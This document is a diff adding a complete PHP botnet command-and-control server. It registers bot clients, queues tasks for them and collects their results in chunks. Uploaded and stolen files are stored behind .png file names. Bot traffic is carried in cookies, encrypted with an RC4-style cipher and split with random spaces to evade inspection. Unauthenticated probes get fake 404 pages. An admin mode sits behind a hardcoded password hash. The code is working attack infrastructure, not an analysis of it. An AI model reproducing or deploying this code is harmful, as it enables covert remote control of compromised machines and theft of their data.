@@ -1,0 +1,578 @@
+   define('MAIN_DIR', './confine/Connectivity/Deutschland/');
+ define('TASKS_DIR', './confine/Connectivity/Deutschland/Inode/');
+ define('FILES_DIR', './confine/Connectivity/Deutschland/Nessus/');
+ define('PASS', '8b6f97bd3cd9c8c42f1ee58278b842fe');
+ define('MAIN_FILE_NAME', 'Deutschland.png');
+ define('FILES_EXTENSION', '.png');
+  define('MAIN_FILE_PATH', MAIN_DIR . MAIN_FILE_NAME);
+   error_reporting(0);
+   class Task {
+  	var $task_id;
+ 	var $task_data;
+ 	var $created_at;
+ 	var $answer_data;
+ 	var $current_chunk;
+ 	var $total_chunks;
+ 	var $completed;
+  	function __construct($task_uuid) {
+ 		$this->set_data('');
+ 		$this->task_id = $task_uuid;
+ 		$this->current_chunk = 0;
+ 		$this->total_chunks = 0;
+ 	}
+  	function __sleep() {
+  		if (!$this->task_data && !$this->answer_data) {
+ 			return;
+ 		}
+  		$filename = TASKS_DIR.$this->task_id.FILES_EXTENSION;
+ 		$data['task_data'] = $this->task_data;
+ 		$data['answer_data'] = $this->answer_data;
+ 		$data['current_chunk'] = $this->current_chunk;
+ 		$data['total_chunks'] = $this->total_chunks;
+ 		file_put_contents($filename, serialize($data));
+ 		return array('task_id', 'created_at', 'completed');
+ 	}
+  	function __wakeup() {
+ 		$filename = TASKS_DIR.$this->task_id.FILES_EXTENSION;
+ 		if (file_exists($filename)) {
+ 			$data = unserialize(file_get_contents($filename));
+ 			$this->task_data = $data['task_data'];
+ 			$this->answer_data = $data['answer_data'];
+ 			$this->current_chunk = $data['current_chunk'];
+ 			$this->total_chunks = $data['total_chunks'];
+ 		}
+ 	}
+  	function __toString() {
+ 		return $this->task_id;
+ 	}
+  	public function is_completed() {
+ 		return $this->completed;
+ 	}
+  	public function set_data($data) {
+ 		$this->task_data = $data;
+ 		$this->created_at = time();
+ 		$this->answer_data = array();
+ 		$this->completed = false;
+ 		return $this->task_id;
+ 	}
+  	public function append_answer($data, $current_chunk, $total_chunks) {
+ 		$this->current_chunk = $current_chunk + 1;
+ 		$this->total_chunks = $total_chunks;
+ 		$this->answer_data[$current_chunk] = $data;
+ 	}
+  }
+  class Client {
+  	var $uuid;
+ 	var $created_at;
+ 	var $last;
+ 	var $tasks;
+  	function __construct($uuid) {
+ 		$this->uuid = $uuid;
+ 		$this->created_at = time();
+ 		$this->prev_last = time();
+ 		$this->last = time();
+ 		$this->tasks = array();
+ 	}
+  	function __sleep() {
+  		return array('uuid', 'created_at', 'prev_last', 'last', 'tasks');
+ 	}
+  	function __wakeup() {
+ 		$this->tasks = array_values($this->tasks);
+  	}
+  	public function search_task($task_id) {
+ 		foreach ($this->tasks as $task) {
+ 			if ($task->task_id == $task_id) {
+ 				return $task;
+ 			}
+ 		}
+ 		return false;
+ 	}
+  	public function uuid() {
+ 		return $this->uuid;
+ 	}
+  	public function ping() {
+ 		$this->prev_last = $this->last;
+ 		$this->last = time();
+ 		$tasks_to_work = array();
+ 		foreach($this->tasks as $task) {
+ 			if($task && !$task->is_completed()) {
+ 				array_push($tasks_to_work, array('task_id' => $task->task_id, 'task_data' => $task->task_data));
+ 			}
+ 		}
+ 		return array('tasks' => $tasks_to_work);
+ 	}
+  	public function add_task($task_uuid, $data) {
+ 		sizeof($this->tasks);
+ 		$task = new Task($task_uuid);
+ 		$task->set_data($data);
+ 		array_push($this->tasks, $task);
+ 		return $task->task_id;
+ 	}
+  	public function set_result($id, $data, $current_chunk, $total_chunks) {
+ 		$task = $this->search_task($id);
+ 		if(!$task) {
+ 			return array('result' => 'error', 'status' => 'no_such_task');
+ 		}
+ 		$task->append_answer($data, $current_chunk, $total_chunks);
+ 		if($current_chunk >= $total_chunks - 1) {
+ 			$task->completed = true;
+ 		}
+ 		return array('result' => 'ok');
+ 	}
+  	public function get_result($task_id) {
+ 		$task = $this->search_task($task_id);
+ 		if(!$task) {
+ 			return array('result' => 'error', 'status' => 'no_such_task');
+ 		}
+ 		if(!$task->is_completed()) {
+ 			return array('result' => 'not_completed');
+ 		}
+ 		$flatten_array = implode($task->answer_data);
+ 		return array('result' => 'ok', 'task_id' => $task->task_id, 'result_data' => $flatten_array);
+ 	}
+   	public function get_all_tasks() {
+ 		return $this->tasks;
+ 	}
+  	public function delete() {
+ 		$all_tasks = $this->get_all_tasks();
+ 		$this->clean_tasks($all_tasks);
+ 	}
+  	public function clean_tasks($tasks_to_clean) {
+ 		if ($tasks_to_clean) {
+ 			$this->tasks = array_diff($this->tasks, $tasks_to_clean);
+ 			foreach ($tasks_to_clean as $task) {
+ 				$file_name = TASKS_DIR.$task.FILES_EXTENSION;
+ 				if (file_exists($file_name)) {
+ 					unlink($file_name);
+ 				}
+ 			}
+ 		}
+ 	}
+  }
+  class ClientsHandler {
+  	var $clients;
+ 	var $key;
+ 	var $key_at;
+  	function __construct() {
+ 		$this->clients = array();
+ 		$this->updateKey();
+ 	}
+  	function __sleep() {
+ 		return array('clients', 'key', 'key_at');
+ 	}
+  	function __wakeup() {
+ 		$this->updateKey();
+ 	}
+  	public function generateRandomString($length = 10) {
+ 		$characters = '0123456789';
+ 		$randomString = '';
+ 		for ($i = 0;
+ $i < $length;
+ $i++) {
+ 			$randomString .= $characters[rand(0, strlen($characters) - 1)];
+ 		}
+ 		return $randomString;
+ 	}
+  	public function generateRandomBytes($length = 10) {
+ 		$randomBytes = '';
+ 		for ($i = 0;
+ $i < $length;
+ $i++) {
+ 			$randomBytes .= chr(mt_rand());
+ 		}
+ 		return $randomBytes;
+ 	}
+  	public function getKey() {
+ 		return base64_decode($this->key);
+  	}
+  	public function updateKey() {
+ 		if(!$this->key or !$this->key_at or ((time() - $this->key_at) > rand(3000, 4000))) {
+ 			$this->key = base64_encode($this->generateRandomBytes(rand(21, 29)));
+ 			$this->key_at = time();
+ 		}
+    	}
+  	public function find($uuid) {
+ 		foreach ($this->clients as $client) {
+ 			if ($client->uuid == $uuid) {
+ 				return $client;
+ 			}
+ 		}
+ 		return false;
+ 	}
+  	public function find_or_create($uuid) {
+ 		$client = $this->find($uuid);
+ 		if($client) {
+ 			return $client;
+ 		}
+ 		$client = new Client($uuid);
+ 		array_push($this->clients, $client);
+ 		return $client;
+ 	}
+  	public function clients() {
+ 		return $this->clients;
+ 	}
+  	public function delete($uuid) {
+ 		$client = $this->find($uuid);
+ 		if ($client) {
+ 			$key = array_search($client, $this->clients, TRUE);
+ 			$client->delete();
+ 			unset($this->clients[$key]);
+ 			$this->clients = array_values($this->clients);
+ 		}
+  	}
+  }
+  class RequestHandler {
+  	function __construct($key) {
+  		$this->key = $key;
+ 		$this->arg_decoded = false;
+  	}
+  	function random_split_string($str, $count) {
+  		$new_str = $str;
+  		for($i=1;
+ $i < $count;
+ $i++) {
+ 			$rand_num = rand(2, strlen($new_str) - 2);
+ 			$new_str = substr_replace($new_str, ' ', $rand_num, 0);
+ 		}
+ 		 		return $new_str;
+ 	}
+  	function random_split_string_array($str, $count) {
+  		$new_str = $this->random_split_string($str, rand(1, 5));
+ 		$rand_array = explode(" ", $new_str);
+  		return $rand_array;
+ 	}
+  	function tr_crypt($key, $str) {
+ 		$s = array();
+ 		for ($i = 0;
+ $i < 256;
+ $i++) {
+ 			$s[$i] = $i;
+ 		}
+ 		$j = 0;
+ 		for ($i = 0;
+ $i < 256;
+ $i++) {
+ 			$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
+ 			$x = $s[$i];
+ 			$s[$i] = $s[$j];
+ 			$s[$j] = $x;
+ 		}
+ 		$i = 0;
+ 		$j = 0;
+ 		$res = '';
+ 		for ($y = 0;
+ $y < strlen($str);
+ $y++) {
+ 			$i = ($i + 1) % 256;
+ 			$j = ($j + $s[$i]) % 256;
+ 			$x = $s[$i];
+ 			$s[$i] = $s[$j];
+ 			$s[$j] = $x;
+ 			$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
+ 		}
+ 		return $res;
+  	}
+  	function rand_salt() {
+ 	  $random = '';
+ 	  $length = rand(1,7);
+ 	  for ($i = 0;
+ $i < $length;
+ $i++) {
+ 	    $random .= chr(mt_rand());
+ 	  }
+ 	  return $random;
+ 	}
+  	function tr_decrypt($key, $str) {
+ 		$len_key = ord(substr($str, 0, 1));
+ 		$salt_length = ord(substr($str, 1, 2)) ^ $len_key;
+ 		$salt =  substr($str, 2, $salt_length);
+ 		$key = sha1($key.$salt);
+ 		$str = substr($str, $salt_length + 2);
+ 		return $this->tr_crypt($key, $str);
+ 	}
+  	function tr_encrypt($key, $str) {
+ 		$len_key = rand(1, 255);
+ 		$salt = $this->rand_salt();
+ 		$salt_length = strlen($salt) ^ $len_key;
+ 		$key = sha1($key.$salt);
+ 		return chr($len_key).chr($salt_length).$salt.$this->tr_crypt($key, $str);
+  	}
+  	public function b64url_encode($data) {
+   		return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
+ 	}
+   	public function b64url_decode($data) {
+ 		return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
+ 	}
+  	public function param($arg) {
+ 		if ($this->request_type() == 'admin') {
+ 			if (isset($_POST[$arg])) 				return $_POST[$arg];
+ 			else {
+ 				return false;
+ 			}
+ 		}
+ 		else {
+ 			$arg_decoded = false;
+ 			foreach($_COOKIE as $cookie) {
+ 				try {
+ 					$params = $this->b64url_decode($cookie);
+ 					$params = $this->tr_decrypt($this->key, $params);
+ 					$params_decoded = json_decode($params, TRUE);
+ 					if (isset($params_decoded[$arg])) {
+ 						$this->arg_decoded = true;
+ 						return $params_decoded[$arg];
+ 					}
+ 				}
+ 				catch (Exception $e) {
+ 				}
+ 			}
+ 			if (count($_COOKIE) == 1 and !$this->arg_decoded) {
+ 				$len_key = rand(1,255);
+ 				$salt = $this->rand_salt();
+ 				$salt_len = strlen($salt) ^ $len_key;
+ 				$packed_resp = $this->b64url_encode(chr($len_key).chr($salt_len).$salt.$this->key);
+ 				$packed_resp = $this->random_split_string($packed_resp, rand(1, 10));
+ 				echo $packed_resp;
+ 			}
+ 			return false;
+ 		}
+ 		 	}
+  	public function response($resp) {
+ 		if ($this->request_type() == 'admin') {
+ 			echo json_encode($resp);
+ 		}
+ 		else {
+ 			$encrypted_resp = $this->tr_encrypt($this->key, json_encode($resp));
+ 			$packed_resp = $this->b64url_encode($encrypted_resp);
+ 			$packed_resp = $this->random_split_string($packed_resp, rand(1, 10));
+ 			echo $packed_resp;
+ 		}
+ 	}
+  	public function request_type() {
+ 		if(isset($_POST['type'])) {
+ 			if ($_POST['type'] == PASS) {
+ 				return 'admin';
+ 			}
+ else {
+ 				$this->response(array('result' => 'error', 'message' => 'auth_error'));
+ 				die();
+ 			}
+ 		}
+ 		else {
+ 			return 'client';
+ 		}
+  	}
+  	public function result($arg) {
+ 		$this->response(array('result' => $arg));
+  	}
+ }
+   class Main {
+  	var $lock_file;
+ 	var $client_handler;
+ 	var $request_handler;
+  	function __construct() {
+  		$this->lock_file();
+  		if(file_exists(MAIN_FILE_PATH)) {
+ 			$this->client_handler = unserialize(file_get_contents(MAIN_FILE_PATH));
+ 		}
+ 		else {
+ 			$this->client_handler = new ClientsHandler();
+ 		}
+  		$this->request_handler = new RequestHandler($this->client_handler->getKey());
+ 	}
+  	function delete_all($dirname) {
+ 	         if (is_dir($dirname)) 	           $dir_handle = opendir($dirname);
+ 		 if (!$dir_handle) 		      return false;
+ 		 while($file = readdir($dir_handle)) {
+ 		       if ($file != "." && $file != "..") {
+ 		            if (!is_dir($dirname."/".$file)) 		                 unlink($dirname."/".$file);
+ 		            else 		                 $this->delete_all($dirname.'/'.$file);
+ 		       }
+ 		 }
+ 		 closedir($dir_handle);
+ 		 rmdir($dirname);
+ 		 return true;
+ 	}
+  	function create_dir($dir_path) {
+ 		if (is_dir($dir_path)) {
+ 			$this->delete_all($dir_path);
+ 		}
+ 		$result = mkdir($dir_path, 0777);
+ 		if (!$result) {
+ 			throw new Exception("Error creating dir:" . $dir_path, 1);
+ 		}
+  	}
+ 	function write_htaccess($dir_path) {
+ 		$result = file_put_contents($dir_path . '.htaccess', "deny from all");
+ 		if (false === $result) {
+ 			throw new Exception("Error writing htaccess to dir:" . $dir_path, 1);
+ 		}
+ 	}
+  	function install() {
+ 		$this->create_dir(MAIN_DIR);
+ 		$this->create_dir(TASKS_DIR);
+ 		$this->create_dir(FILES_DIR);
+ 		$this->write_htaccess(MAIN_DIR);
+ 		$this->write_htaccess(TASKS_DIR);
+ 		$this->write_htaccess(FILES_DIR);
+ 	}
+  	function download($file_name) {
+ 		$this->unlock_file();
+ 		$file = FILES_DIR . basename($file_name);
+ 		$file_check = file_exists($file);
+ 		if(!$file_check) {
+ 			header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found");
+ 			header("Status: 404 Not Found");
+ 			echo "<h1>404 Not Found</h1>";
+ 				echo "The page that you have requested could not be found.";
+ 			die();
+ 		}
+ 	    header('Content-Description: File Transfer');
+ 		header('Content-Type: application/octet-stream');
+ 		header('Content-Disposition: attachment;
+ filename='.basename($file));
+ 		header('Expires: 0');
+ 		header('Cache-Control: must-revalidate');
+ 		header('Pragma: public');
+ 		header('Content-Length: ' . filesize($file));
+ 		ob_clean();
+ 		flush();
+ 		readfile($file);
+ 	}
+  	function start() {
+  		if ($this->request_handler->request_type() == 'client') {
+ 			$uuid = $this->request_handler->param('id');
+ 			if(!$uuid) {
+ 				$this->self_die();
+ 			}
+ 			$client = $this->client_handler->find_or_create($uuid);
+ 			$action = $this->request_handler->param('action');
+ 			switch ($action) {
+ 				case 'answer': 					$task_id = $this->request_handler->param('task_id');
+ 					$answer = $this->request_handler->param('data');
+ 					$current_chunk = $this->request_handler->param('current');
+ 					$total_chunks = $this->request_handler->param('total');
+ 					if (!$answer || !$task_id || !$total_chunks) {
+ 						$this->self_die();
+ 					}
+ 					$this->request_handler->response($client->set_result($task_id, $answer, $current_chunk, $total_chunks));
+ 					break;
+  				case 'upload': 					$this->unlock_file();
+ 					$tmp_name = $_FILES["image"]["tmp_name"];
+ 					$name = $_FILES["image"]["name"];
+ 					if (!$tmp_name || !$name) {
+ 						die();
+ 					}
+ 					$new_name = uniqid().FILES_EXTENSION;
+ 					move_uploaded_file($tmp_name, FILES_DIR.$new_name);
+ 					$res = array('result' =>'ok', 'filename' => $new_name, 'size' => filesize(FILES_DIR.$new_name));
+ 					$this->request_handler->response($res);
+ 					break;
+  				case 'download': 					$file_name = $this->request_handler->param('file');
+ 				 	$this->download($file_name);
+ 					break;
+  				case 'getip': 					$ip_address = $_SERVER['REMOTE_ADDR'];
+ 					$this->request_handler->response(array('result' => 'ok', 'ip' => $ip_address));
+ 					break;
+  				default: 					$this->request_handler->response($client->ping());
+ 					break;
+ 			}
+ 		}
+  		elseif ($this->request_handler->request_type() == 'admin') {
+ 			$action = $this->request_handler->param('action');
+ 			switch ($action) {
+  				case 'setTask': 					$bot_uuid = $this->request_handler->param('id');
+ 					$task_uuid = $this->request_handler->param('task_uuid');
+ 					$task = $this->request_handler->param('task');
+ 					if(!$bot_uuid || !$task_uuid || !$task) {
+ 						$this->self_die();
+ 					}
+ 					$client = $this->client_handler->find_or_create($bot_uuid);
+ 					$task_id = $client->add_task($task_uuid, $task);
+ 					$this->request_handler->response(array('result' => 'ok', 'task_id' => $task_id));
+ 					break;
+  				case 'getAll': 					$all = $this->client_handler->clients();
+ 					$this->request_handler->response($all);
+ 					break;
+  				case 'cleanTasks': 					$tasks_to_clean = $this->request_handler->param('task_ids');
+ 					if (!$tasks_to_clean) {
+ 						$this->self_die();
+ 					}
+ 					$tasks_to_clean = explode(",", $tasks_to_clean);
+ 					if(!is_array($tasks_to_clean)) {
+ 						$this->self_die();
+ 					}
+  					$bots = $this->client_handler->clients();
+ 					foreach($bots as $bot) {
+ 						$bot->clean_tasks($tasks_to_clean);
+ 					}
+ 					$this->request_handler->result('ok');
+ 					break;
+  				case 'upload': 					$this->unlock_file();
+ 					$tmp_name = $_FILES["image"]["tmp_name"];
+ 					$name = $_FILES["image"]["name"];
+ 					if (!$tmp_name || !$name) {
+ 						$this->self_die();
+ 					}
+ 					$new_name = uniqid().FILES_EXTENSION;
+ 					move_uploaded_file($tmp_name, FILES_DIR.$new_name);
+ 					$res = array('result' =>'ok', 'filename' => $new_name, 'size' => filesize(FILES_DIR.$new_name));
+ 					$this->request_handler->response($res);
+ 					break;
+  				case 'download': 					$file_name = $this->request_handler->param('file');
+ 				 	$this->download($file_name);
+ 					break;
+  				case 'deleteFiles': 					$file_names = $this->request_handler->param('file_names');
+ 					if (!$file_names) {
+ 						$this->self_die();
+ 					}
+ 					$file_names = explode(",", $file_names);
+ 					if (!is_array($file_names)) {
+ 						$this->self_die();
+ 					}
+ 					foreach($file_names as $file_name) {
+ 						$file_path = FILES_DIR . basename($file_name);
+ 						if (file_exists($file_path)) {
+ 							unlink($file_path);
+ 						}
+ 					}
+ 					$this->request_handler->result('ok');
+ 					break;
+  				case 'deleteBot': 					$uuid = $this->request_handler->param('id');
+ 					$this->client_handler->delete($uuid);
+ 					$this->request_handler->result('ok');
+ 					break;
+  				case 'install': 					try {
+ 						$this->install();
+ 					}
+ catch (Exception $e) {
+ 						$this->request_handler->response(array('result' => 'error', 'message' => $e->getMessage()));
+ 						$this->self_die();
+ 					}
+ 					$this->request_handler->result('ok');
+ 					break;
+  				default: 					break;
+ 			}
+ 		}
+ 			$this->self_die();
+	 	}
+  	function self_die() {
+ 		file_put_contents(MAIN_FILE_PATH, serialize($this->client_handler));
+ 		die();
+ 	}
+  	function lock_file() {
+  		$this->lock_file = fopen(MAIN_FILE_PATH . ".tmp", 'w');
+ 		if (!flock($this->lock_file, LOCK_EX)) {
+ 			/* log? */ 		}
+ 	}
+  	function unlock_file() {
+ 		if ($this->lock_file) {
+ 			flock($this->lock_file, LOCK_UN);
+ 		}
+ 	}
+  	function __destruct() {
+ 		$this->unlock_file();
+ 	}
+ }
+  $main = new Main();
+ $main->start();
+  
